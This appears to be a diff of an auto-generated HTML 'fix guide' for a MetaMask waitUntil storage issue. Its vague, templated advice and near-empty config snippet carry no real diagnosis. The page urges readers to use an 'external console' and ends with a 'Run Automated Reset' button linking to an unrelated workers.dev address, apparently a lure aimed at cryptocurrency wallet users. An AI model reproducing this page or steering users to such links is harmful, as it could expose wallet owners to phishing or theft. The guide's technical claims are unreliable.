@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Using Waituntil To Ensure Async Storage Writes Finish – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #0a0c10;
+        font-family: BlinkMacSystemFont;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #00adb5; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -42,35 +42,34 @@
 <h1>Metamask Extension Using Waituntil To Ensure Async Storage Writes Finish</h1>
 <h2>Symptom</h2>
 <ul>
-<li>The Metamask extension is experiencing issues with asynchronous storage writes, resulting in incomplete or failed transactions, and displaying an error message indicating the use of <code>waitUntil</code> to ensure async storage writes finish.</li>
+<li>Users encounter an issue where the Metamask extension is utilizing the <code>waitUntil</code> function to ensure asynchronous storage writes are completed, but this process appears to be timing out or causing delays.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to the asynchronous nature of storage writes in the Metamask extension, which can lead to inconsistencies if not properly handled, prompting the extension to use <code>waitUntil</code> to ensure all writes are completed before proceeding.</li>
+<li>The error occurs due to the asynchronous nature of storage writes in the Metamask extension, where the <code>waitUntil</code> function is used to pause the execution of the code until the storage writes are finished, but it may not be properly configured or may be experiencing unexpected delays.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following manual overrides:</li>
-<li>Increase the timeout value for async storage writes to allow for more time to complete.</li>
-<li>Implement a retry mechanism for failed storage writes to ensure data consistency.</li>
-<li>Use a more robust storage solution, such as a caching layer, to improve performance and reduce the likelihood of errors.</li>
+<li>To resolve this issue, users can attempt the following manual overrides:</li>
+<li>Increase the timeout value for the <code>waitUntil</code> function to allow more time for the storage writes to complete.</li>
+<li>Use a different asynchronous handling mechanism, such as Promises or Observables, to manage the storage writes.</li>
+<li>Implement a retry mechanism to handle any failed storage writes.</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;storage&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;retry&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span>
+<span class="w">    </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console to further diagnose and resolve the issue.</p>
+<p>Consider utilizing an external console to execute these commands for more flexibility. </p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured</li>
-<li>Familiarity with asynchronous storage writes and their potential issues</li>
-<li>Basic understanding of JSON configuration files</li>
+<li>Basic understanding of asynchronous programming concepts</li>
+<li>Familiarity with the <code>waitUntil</code> function and its usage in the Metamask extension</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-unable-to-cancel-pending-transaction-due.html">Metamask Extension Bug Unable To Cancel Pending Transaction Due</a></li><li><a href="./archive/2026/06/metamask-extension-bug-after-sending-a-transaction-on-custom-ne.html">Metamask Extension Bug After Sending A Transaction On Custom Network</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-all-scripts-load.html">Metamask Extension Using Waituntil To Ensure All Scripts Load</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-after-sending-a-transaction-on-custom-ne.html">Metamask Extension Bug After Sending A Transaction On Custom Network</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-unable-to-cancel-pending-transaction-due.html">Metamask Extension Bug: Unable To Cancel Pending Transaction Due To Not Enough Gas Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
